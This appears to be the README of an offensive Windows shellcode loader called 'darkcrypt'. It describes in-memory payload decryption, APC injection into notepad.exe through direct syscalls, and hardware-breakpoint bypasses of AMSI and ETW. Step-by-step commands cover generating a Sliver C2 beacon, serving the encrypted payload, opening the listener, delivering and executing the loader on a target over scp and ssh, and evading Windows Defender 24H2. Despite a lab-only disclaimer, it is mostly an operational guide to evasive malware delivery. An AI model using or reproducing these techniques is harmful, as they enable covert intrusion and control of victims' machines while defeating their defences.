<div align="center">

# darkcrypt

**C shellcode loader for Windows x64. Direct syscalls, HWBP AMSI/ETW bypass, Win11 24H2. Cross-compiled from Linux via mingw-w64.**

</div>

---

> ⚠️ Authorized lab use only (snapshot VMs, HTB, Vulnlab). You own your use.

## What it does

Fetches an AES-256-CBC + HMAC-SHA256 payload over WinHTTP, verifies and decrypts it in memory via Windows CNG, spawns a suspended host process, and dispatches the shellcode through a direct-syscall `NtQueueApcThread` trampoline (Halos Gate — SSN resolved from fresh ntdll bytes, `syscall;ret` emitted from a local stub). ETW and AMSI are silenced via hardware breakpoints in both the loader and the beacon's host, with a third-APC that re-arms DR0 on `AmsiScanBuffer` inside the running beacon.

**~62 KB release binary, IOC-scanner clean.** All sensitive strings (`amsi.dll`, module names, WinHTTP constants, registry paths) are XOR-encoded in source via multi-byte rolling-key helpers and decoded onto stack buffers at point of use. `check_iocs.py` enforces this — the release build fails if any plaintext IOC survives into `.rdata`.

## Build

```bash
sudo pacman -S mingw-w64-gcc    # or your distro's equivalent

make release                    # stripped, -Os, no debug prints — ship this
make debug                      # DBG_PRINTF to stderr — lab only (Nt* names in .rdata)
make release-nocrt              # no CRT, sub-50 KB loader-nocrt.exe
```

IOC gate:

```bash
python3 tools/check_iocs.py build/loader.exe
# expected: PASS   (debug builds fail by design — DBG_PRINTF embeds Nt* names)
```

## Usage

1. Generate a Sliver shellcode:
   ```
   sliver > generate --mtls <c2>:8443 --os windows --arch amd64 --format shellcode \
                     --save /tmp/beacon.bin --shellcode-exitopt 3 --shellcode-entropy 3 --skip-symbols
   ```
   `--shellcode-exitopt 3` wraps the beacon in a Donut shell that blocks the implant thread instead of returning.
2. Forge the payload (encrypts, writes `aes.encrypted`, patches fresh AES + MAC keys into `src/aes-main.c`):
   ```bash
   ./forge.sh /tmp/beacon.bin
   ```
3. Rebuild and re-gate:
   ```bash
   make release
   python3 tools/check_iocs.py build/loader.exe
   ```
4. Serve the payload (same cwd as `aes.encrypted`):
   ```bash
   python3 -m http.server 8080
   ```
5. Open the listener:
   ```
   sliver > mtls -L 0.0.0.0 -l 8443
   ```
6. Deliver and fire:
   ```bash
   scp build/loader.exe user@target:C:/Users/user/loader.exe
   ssh user@target 'C:\Users\user\loader.exe'
   ```
   Session lands on Sliver in a few seconds.

The C2 URL in `src/aes-main.c` defaults to `http://<C2>:8080/aes.encrypted` — edit if your server differs. `forge.sh` only touches the key arrays. The host process is chosen in `src/inject.c` via an XOR-encoded 17-byte array; default is `notepad.exe`.

## Modes

- `make release` — stripped ~62 KB loader for ops.
- `make debug` — DBG_PRINTF to stderr, 327 KB. Lab only.
- `make release-nocrt` — sub-50 KB, no CRT linkage.

## Gotchas

- **Host lifetime.** The host's primary thread must block (message pump). `notepad.exe` works; `RuntimeBroker.exe` dies in ~5 s because its primary thread exits after the APC completes.
- **Third-APC timing (release-only race).** `remote_hwbp_finish_amsi()` fires a `SpecialUserAPC` for `LoadLibraryA("amsi.dll")` onto the thread running the Sliver beacon. Without a head start the APC lands mid-mTLS handshake and Sliver logs `Rejecting legacy mtls connection (missing yamux preface)` — no session registers. `inject.c` holds a `pWaitForSingleObject(pi.hThread, 1000)` that gives the beacon its handshake window. Debug builds mask the race via printf overhead; release builds race through and break without the wait.
- **Payload cap.** `MAX_PAYLOAD_SIZE` in `src/http.c` is 32 MB. Bump for larger payloads (Donut-wrapped Sliver tips 23 MB).
- **Signatured .NET via `execute-assembly -i`.** HWBP AMSI returns CLEAN as told, but Defender 24H2 ships `Behavior:Win32/AMSI_Patch_T.B12` which trips on the CLEAN-on-dirty mismatch. Running signatured tooling (Seatbelt, Rubeus, SharpHound, Mimikatz) through `-i` burns the host in ~2 s. Use sacrificial-process mode (Sliver default, no `-i`), or build recon tools unsignatured from source.
- **Session 0.** Loader launched via OpenSSH's `sshd` runs in Session 0 — no desktop. Migrate to a Session-1 process before screenshotting:
  ```
  sliver (SESSION) > ps                                 # find explorer.exe PID
  sliver (SESSION) > migrate --pid <explorer_pid>       # encoder prompt: none
  ```
- **LSP red squiggles.** Clang can't find `windows.h` while cross-compiling; all `unknown type` errors in `aes-main.c` and friends are false positives. Trust `make`.
- **Snapshot VMs.** Start every run from a clean snapshot.

## Cross-port

| Build          | Size    | Imports               | IOC | Win11 24H2 Defender |
|----------------|---------|-----------------------|-----|---------------------|
| darkcrypt (C)  | 62 KB   | kernel32, ntdll       | 0   | ✓                   |
| darkcrypt-cs   | 37 KB   | n/a (.NET)            | n/a | ✓                   |
| darkcrypt-rs   | 37.8 KB | KERNEL32 only, 8 names| 1   | ✓                   |
